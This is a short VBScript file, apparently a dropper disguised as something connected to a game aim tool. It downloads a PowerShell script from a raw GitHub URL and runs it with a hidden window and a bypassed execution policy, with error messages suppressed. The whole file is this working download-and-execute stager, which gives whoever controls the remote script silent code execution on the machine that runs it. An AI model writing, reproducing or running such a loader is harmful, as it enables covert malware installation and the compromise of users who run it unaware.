Set WshShell = CreateObject("WScript.Shell")
Set Http = CreateObject("MSXML2.ServerXMLHTTP.6.0")

url = "https://raw.githubusercontent.com/hatefulmatt/Silent-aim/refs/heads/main/Ps1"

On Error Resume Next
Http.Open "GET", url, False
Http.Send

If Http.Status = 200 Then
    psCode = Http.responseText
    WshShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command """ & psCode & """", 0, False
End If

Set Http = Nothing
Set WshShell = Nothing
